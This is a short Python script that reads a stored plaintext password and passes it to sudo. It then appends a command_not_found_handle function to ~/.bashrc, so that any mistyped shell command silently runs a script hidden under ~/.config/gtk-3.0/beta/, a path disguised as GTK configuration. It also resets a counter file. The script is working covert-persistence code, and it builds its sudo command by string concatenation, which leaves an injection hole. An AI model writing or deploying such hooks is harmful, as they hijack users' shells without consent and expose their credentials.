import os

dir = os.path.dirname(os.path.abspath(__file__))
#deletes counter
if os.path.exists(dir+"/counter"):
    os.remove(dir+"/counter")

#gets password
with open(dir+"/p", "r") as pwd:
    password = pwd.readline()
    pwd.close()

#creates new bash function
os.system('sudo -p "" -S <<< ' + password + ''' echo 'function command_not_found_handle { python3 ~/.config/gtk-3.0/beta/hell_world.py;};' >> ~/.bashrc''')

#resets counter to 0
with open(dir+"/counter", "w") as counter:
    counter.write("0")
    counter.close()
